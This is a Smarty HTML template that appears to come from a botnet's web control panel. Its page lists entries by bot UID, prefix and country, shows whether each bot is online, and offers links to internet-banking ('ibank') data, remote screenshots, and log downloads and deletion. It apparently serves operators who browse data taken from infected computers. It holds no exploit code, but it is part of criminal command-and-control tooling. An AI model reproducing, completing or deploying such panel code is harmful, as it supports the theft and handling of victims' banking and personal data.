{*include file="modules/cabs/menu.tpl"*}

<div class="top_menu">

<div class="top_menu_left">
<span style="font-size: 22px; color:#CCCCCC">{$lang.cabs}</span>
</div>

<div class="top_menu_right">
{if $_SESSION.user->access.cabs.ibank eq on}<a href="/cabs/ibank.html">{$lang.ibank}</a>&nbsp;{/if}
</div>

</div>
<hr />

<form action="#" method="post" enctype="multipart/form-data" name="screens_filter" id="screens_filter">

<div style="text-align: right; padding-right: 10px; padding-left: 10px">

{$lang.type}: <select id="type" name="type" style="width:580px;">
<option value="">{$lang.csv}</option>
{foreach from=$types item=type}
<option value="{$type->type}"{if $_SESSION.ctype eq $type->type} selected="selected"{/if}>{$type->type|@strtoupper}</option>
{/foreach}
</select>
<a href="#" onclick="get_sclear();"><img src="/images/edit.png" /></a>
<hr />
{$lang.pref} (<a onclick="alert('{$lang.zpref}');" style="cursor:pointer">?</a>): <select id="prefix" name="prefix" style="width:600px">
{if $_SESSION.user->config.prefix eq ''}<option value="ALL">{$lang.all}</option>{/if}
{foreach from=$prefix item=pref}
<option value="{$pref}"{if $_SESSION.search.$ctype.prefix eq $pref} selected="selected"{/if}>{$pref}</option>
{/foreach}
</select>
<hr />
{$lang.uid} (<a onclick="alert('{$lang.uid_desc}');" style="cursor:pointer">?</a>): <input name="uid" type="text" style="width:600px" value="{$_SESSION.search.$ctype.uid}"/>
<hr />
{$lang.country} (<a onclick="alert('{$lang.cdesc}');" style="cursor:pointer">?</a>): <select id="country" name="country" style="width:600px">
<option value="ALL">{$lang.all}</option>
{foreach from=$country item=d}
<option value="{$d->country}"{if $_SESSION.search.$ctype.country eq $d->country} selected="selected"{/if}>{$d->country}</option>
{/foreach}
</select>
<hr />
{$lang.date} (<a onclick="alert('{$lang.ddesc}');" style="cursor:pointer">?</a>): <select id="data" name="date" style="width:600px">
<option value="ALL">{$lang.all}</option>
{foreach from=$date item=d}
<option value="{$d->date}"{if $_SESSION.search.$ctype.date eq $d->date} selected="selected"{/if}>{$d->date}</option>
{/foreach}
</select>
<hr />
{$lang.pbpf} (<a onclick="alert('{$lang.pbpfde}');" style="cursor:pointer">?</a>): <input name="file_name" type="text" style="width:600px" value="{$smarty.post.file_name}"/>
<hr />
<input type="button" name="update" value="{$lang.upda}" style="width:100%" onclick="return get_hax({ldelim}url: '/cabs/index.html?ajax=1',method:'post',id:'content',form:'screens_filter'{rdelim});" />
</div>
</form>
{if $files}

<div style="font-size:10px" align="center"><br /><a href="/logs/download-13.html?file={$_SESSION.ctype}" target="_blank" onclick="return confirm('Вы уверены?');">{$lang.svlr}</a></div>
<br />
<div style="font-size:10px; position:relative" align="center">
<div style="position:absolute; left: 0px; top:10px">{$lang.maxstr}: {$_SESSION.user->config.cp.cabs}</div>
&nbsp;{$pages}&nbsp;
<div style="position:absolute; right: 0px; top:10px">{$lang.vsego}: {$counts}</div>
</div>
<br />

<form action="#" name="groups" >
<table cellspacing="1" cellpadding="5" class="t" style="width: 100%; text-align:center; border: 1px solid #cccccc;">
<tr class="t4">
	<td class="bgp3">{$lang.uid}</td>
    <td class="bgp3" style="width:10%">{$lang.bot}</td>
    <td class="bgp3" style="width:10%">{$lang.filov}</td>
    <td class="bgp3" style="width:10%">{$lang.country}</td>
    <td class="bgp3" style="width:19%">{$lang.comm}</td>
    <td class="bgp3" style="width:15%" title="{$lang.datep}">{$lang.date}</td>
    <td class="bgp3" style="width:1px"></td>
    <td class="bgp3" style="width:1px"></td>
    <td class="bgp3" style="width:1px"></td>
</tr>
{foreach from=$files item=file name=files}
{if $smarty.foreach.files.iteration is not even}{assign var=bg value=2}{else}{assign var=bg value=1}{/if}
<tr class="bgp{$bg}" onmousemove="this.className = 'bgp4'" onmouseout="this.className = 'bgp{$bg}'" style="cursor:pointer;">
	<th onclick="get_cab_window('{$file->prefix}{$file->uid}', '{$_SESSION.ctype}');">{$file->prefix}{$file->uid}</th>
    <th {if $online[$file->prefix][$file->uid]}style="background-color:#0F0"{/if}><a onclick="get_bot_window('{$file->prefix}{$file->uid}');">{$lang.show}</a></th>
    <th onclick="get_cab_window('{$file->prefix}{$file->uid}', '{$_SESSION.ctype}');">{$file->count}</th>
    <th onclick="get_cab_window('{$file->prefix}{$file->uid}', '{$_SESSION.ctype}');">{$file->country}&nbsp;</th>
    <th style="{if $file->comment|strpos:"!" ne 0}color:#F00{/if}" onclick="return false;" id="cg_{$file->prefix}{$file->uid}" ondblclick="edit_comment(this, 'groups', '{$_SESSION.ctype}');">{$file->comment}</th>
    <th onclick="get_cab_window('{$file->prefix}{$file->uid}', '{$_SESSION.ctype}');">{$file->post_date|date_format:"%d-%m-%Y"}</th>
    <th><img src="/images/icons/{if file_exists("cache/rscreens/`$file->prefix``$file->uid`/")}calendar.gif{else}box.gif{/if}" title="{$lang.screot}" alt="{$lang.screen}" border="0" onclick="rscreens('{$file->prefix}{$file->uid}');" /></th>
    <th><a href="/logs/download-10.html?str={$file->prefix}{$file->uid}&amp;file={$_SESSION.ctype}" target="_blank"><img src="/images/icons/icon_download.gif" title="{$lang.dld}" alt="{$lang.dl}" border="0" /></a></th>
    <th onclick="delete_list_item('{$file->id}', '{$_SESSION.ctype}', '{$Cur.page}');"><img src="/images/icons/folder_delete.gif" title="{$lang.del}" alt="{$lang.del}" border="0" /></th>
</tr>
{/foreach}
</table>
</form>
<div style="font-size:10px" align="center"><br />&nbsp;{$pages}&nbsp;<br /><br /></div>

{/if}